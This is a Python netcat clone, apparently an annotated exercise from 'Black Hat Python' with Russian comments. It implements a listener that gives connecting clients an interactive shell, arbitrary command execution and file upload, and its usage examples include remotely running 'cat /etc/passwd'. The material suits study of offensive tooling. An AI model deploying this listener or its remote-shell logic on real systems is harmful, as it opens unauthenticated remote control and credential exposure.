import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading


def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)  # 1.0 В данном случае мы используем
    # метод check_output, который выполняет команду в локальной ОС и затем возвращает вывод этой команды.

    return output.decode()

# теперь начнем собирать некоторые из функций указанные после класса вместе, начиная с нашего клиентского кода.


class NetCat:
    # 5.1.1 мы иницируем объект NetCat с помощью аргументов из командной строки и буфера

    def __init__(self, args, buffer=None):
        self.args = args
        self.buffer = buffer
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # 5.1.2 после чего создаем объект сокета
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # метод run, который служит точкой входа для управления объектом NetCat, довольно прост: он делегирует выполнение
    # двум другим методам:

    def run(self):
        if self.args.listen:
            self.listen()  # 5.1.3 если нам нужно подготовить слушателя, вызываем этот метод
        else:
            self.send()  # 5.1.4 а если не нужно, то этот.

    def send(self):
        self.socket.connect((self.args.target, self.args.port))  # 5.2.1 подключ. к серв. с заданным ip и портом.
        if self.buffer:
            self.socket.send(self.buffer)

        try:  # 5.2.2 затем используем try/catch для возможности закрытия вручную комбинацией CTRL + C
            while True:  # 5.2.3 здесь начало цикла чтобы получить данные от уелевого сервера
                recv_len = 1
                response = ''
                while recv_len:
                    data = self.socket.recv(4096)
                    recv_len = len(data)
                    response += data.decode()
                    if recv_len < 4096:
                        break  # 5.2.4 если данных нет выходим из цикла
                if response:
                    print(response)
                    buffer = input('> ')
                    buffer += '\n'
                    self.socket.send(buffer.encode())  # 5.2.5 в противном случае выводим ответ, останавливаемся,
                    # чтобы получить интерактивный ввод, отправляем его и продолжаем цикл.
        except KeyboardInterrupt:  # 5.2.6 цикл работает пока не произойдет исключение "KeyboardInterrupt CTRL + C"
            # в результате чего закроется сокет.
            print('User terminated.')
            self.socket.close()
            sys.exit()

    def listen(self):
        self.socket.bind((self.args.target, self.args.port))  # 5.3.1 мметод listen привязывается к адресу и порту
        self.socket.listen(5)
        while True:  # 5.3.2 начинает прослушивать в цикле
            client_socket, _ = self.socket.accept()
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )  # 5.3.3 передавая подключившиеся сокеты методу handle
            client_thread.start()

    # теперь реализуем логику для загрузки файлов, выполнения команд и создания интерактивной командной оболочки.
    # программа сможет выполнять эти задания в режиме прослушивания:

    def handle(self, client_socket):

        """ метод handle выполняет задание в соответсвии с полученным аргументом командной строки: выполняет команду,
        заружает файл или запускает командную оболочку. Если нужно выполнить команду #5.4.1 метод handle передает её
        функции execute и шлет вывод обратно в сокет. Если нужно загрузить файл  # 5.4.2, мы входим в цикл, чтобы
        получать данные из прослушивающего сокета, до тех пор пока они не перестанут поступать. Затем записываем
        накопленное содержимое в заданый файл. Наконец, если нужно создать командную оболочку #5.4.3, мы входим в
        цикл, передаем отправителю приглашение командной строки и ждем в ответ строку с командой. Затем выполняем
        косанду с помощью функции execute и возвращаем ее вывод отправителю"""

        if self.args.execute:  # 5.4.1
            output = execute(self.args.execute)
            client_socket.send(output.encode())

        elif self.args.upload:  # 5.4.2
            file_buffer = b''
            while True:
                data = client_socket.recv(4096)
                if data:
                    file_buffer += data
                else:
                    break

            with open(self.args.upload, 'wb') as f:
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())

        elif self.args.command:  # 5.4.3
            cmd_buffer = b''
            while True:
                try:
                    client_socket.send(b'BHP: #> ')
                    while '\n' not in cmd_buffer.decode():
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())

                    if response:
                        client_socket.send(response.encode())
                    cmd_buffer = b''
                except Exception as e:
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()


# ниже мы создадим главный блок, ответсвенный за разбор аргументов командной строки и вызов остальных наших функций


if __name__ == '__main__':  # 1.1 для создания интерфейса cmd мы используем модуль argparse из стандартной библиотеки
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example: 
            netcat.py -t 192.168.1.108 -p 5555 -l -c # командная оболочка
             netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt
             # загружаем в файл
             netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\"
             # выполняем команду
             echo 'AB' | ./netcat.py -t 192.168.1.108 -p 135
             # шлем текст на порт сервера 135
             netcat.py -t 192.168.1.108 -p 5555 # соединяемся с сервером
        '''))  # 2 выше представляется справка о применении, которая выводится при запуске программы с параметром
    # "--help", в ней пересимленны 6 аргрументов которые определяют то, как должна вести себя программа
    parser.add_argument('-c', '--command', action='store_true', help='command shell')  # подгот. интерактивную. оболочку
    parser.add_argument('-e', '--execute', help='execute specified command')  # выполняет отдельно взятую команду
    parser.add_argument('-l', '--listen', action='store_true', help='listen')  # указ. что нужно подготовить слушателя
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')  # позв. указ. порт взаимодейств.
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')  # задает ip
    parser.add_argument('-u', '--upload', help='upload file')  # определяет имя файла который нужно загрузить.
    args = parser.parse_args()
    # с этой программой могут работать как отправитель, так и получатель, поэтому параметры определяют, для чего она
    # запускается, для отправки или прослушивания. Аргументы -c, -e и -u подразумевают наличие -l, так как они применимы
    # только к той стороне взаимодействия, которая слушает.
    #
    # Отправляющая сторона соединяется со слушателем, и, чтобы его определить, ей нужны только параметры -t и -p.
    #
    # 4 если программа используется в качестве слушателя, мы вызываем объект NetCat с пустым строковым буфером.
    # в противном случае сохраняем в буфер содержимое stdin.

    if args.listen:  # 4
        buffer = ''
    else:
        buffer = sys.stdin.read()

    nc = NetCat(args, buffer.encode())

    # В конце вызываем метод run чтобы запустить программу.

    nc.run()
